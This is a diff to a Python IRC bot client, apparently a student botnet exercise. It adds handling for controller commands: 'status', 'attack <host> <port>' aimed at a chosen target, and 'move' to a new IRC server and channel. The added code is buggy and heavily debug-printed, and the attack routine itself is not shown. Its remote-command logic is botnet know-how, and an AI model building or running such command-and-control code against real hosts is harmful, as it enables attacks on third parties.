@@ -3,6 +3,7 @@ import socket
 import sys 
 import threading
 import random 
+import traceback
 
 class Bot:
     
@@ -34,10 +35,10 @@ class Bot:
 
         
 
-    def IRCconnect(self):
+    def IRCconnect(self, chan):
         self.sendData("NICK {}\n" .format(self.botNick))
         self.sendData("USER bot * * :{}\n" .format(self.botNick))
-        self.sendData("JOIN #{}\n" .format(self.CHANNEL))
+        self.sendData("JOIN #{}\n" .format(chan))
         resp = self.getData()
         print(resp)
         return "433" in resp
@@ -87,6 +88,25 @@ class Bot:
             self.acceptedCons.append(prefix)
         if prefix in self.acceptedCons:
             print("from " + prefix + " to do " + message)
+            if message == "status":
+                print("sending back status")
+                self.privateMsg(prefix, "!STATUS! " + self.botNick)
+            elif message.startswith("attack"):
+                if len(message.split()) == 3:
+                    hostTarget = message[1]
+                    portTarget = message[2]
+                    self.botAttack(hostTarget, portTarget)
+                else:
+                    print("Incorrect usage of command: attack <host-name> <port>")
+            elif message.startswith("move"):
+                if len(message.split()) == 4:
+                    newHost = message.split()[1]
+                    newPort = message.split()[2]
+                    newChannel = message.split()[3]
+                    self.botMove(newHost, newPort, newChannel)
+                else:
+                    print("Incorrect usage of command: move <host-name> <port> <channel>")
+            
 
     # COMMANDS TO DO -----------------------------------------------------------
 
@@ -108,34 +128,56 @@ class Bot:
     
     # Move Server
     def botMove(self, newHost, newPort, newChannel):
-        global HOST, PORT, CHANNEL, botNick 
+        #global HOST, PORT, CHANNEL, botNick 
         # First attempt to connect to new server 
         try:
             newSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            newSocket.connect((newHost, newPort))
+            print("HOST: " + str(newHost))
+            print("PORT: " + str(newPort))
+            newPort = int(newPort)
+            print("DEBUG: before connect")
+            try:
+                print("DEBUG: in Try")
+                newSocket.connect((newHost, newPort))
+            except:
+                print("DEBUG: in Except")
+                newSocket = self.IRCSOCKET
+                #self.privateMsg((str(self.botNick) + " is in the same server. Attempting to move to new channel only"))
 
-            self.IRCSOCKET.send(msg.encode())
+            #self.IRCSOCKET.send(msg.encode())
             # At this point, if it doesn't throw an exception, it should be good 
             # Now connect bot to channel
             
-            newSocket.send(("NICK {}\n" .format(self.botNick)).encode())
-            newSocket.send(("USER bot * * :{}\n" .format(self.botNick)).encode())
-            newSocket.send(("JOIN #{}\n" .format(self.CHANNEL)).encode())
+            print("DEBUG: Out of tru")
+            #newSocket.send(("NICK {}\n" .format(self.botNick)).encode())
+            #newSocket.send(("USER bot * * :{}\n" .format(self.botNick)).encode())
+            #newSocket.send(("JOIN #{}\n" .format(self.CHANNEL)).encode())
+            self.IRCconnect(newChannel)
+            print("DEBUG: Just tried to connect newSocket stuff")
             resp = self.getData()
             print(resp)
-            return "433" in resp
+            print("DEBUG: I moved ")
+            
 
-            # Disconnect from old Channel
-            IRCSOCKET.close()
+            
 
             # If it reaches this point, connection is successful. Change globals
-            HOST = newHost 
-            PORT = newPort 
-            CHANNEL = newChannel 
-            IRCSOCKET = newSocket 
+            print("I atleast reached here")
+            self.HOST = newHost 
+            self.PORT = newPort 
+            self.CHANNEL = newChannel 
+            # Disconnect from old Channel
+            try:
+                self.IRCSOCKET.close()
+                self.IRCSOCKET = newSocket 
+            except:
+                print("If it is in the same server it doesnt handle it well idk")
             return True 
         except:
             print("ERROR: Unable to move to new channel\nBot still in old channel")
+            tb = traceback.format_exc()
+            print(tb)
+            self.privateMsg("Unable to move to new server.")
             return False 
         
     # Read
@@ -153,8 +195,10 @@ class Bot:
                         elif response.find("PING") != -1:
                             self.sendData("PONG {}: :\r\n".format(self.HOST).encode("utf-8"))                                                                          
                         elif response.find('433') != -1:
-                            self.createNick(self.NICK)
-                            self.connectIRC(self.s,self.NICK, self.chan)  
+                            #self.createNick(self.NICK)
+                            #self.connectIRC(self.s,self.NICK, self.chan)  
+                            # Use this to make new nickname if needed
+                            pass
         except Exception as e:
             print("Exception: ")
             print(e)
@@ -233,7 +277,7 @@ def main():
         print("bot set up")
         print("connecting")
         while noConnection:
-            noConnection = bot.IRCconnect()
+            noConnection = bot.IRCconnect(CHANNEL)
         
         print("Controller is running. Connected with nick: " + bot.botNick)
 
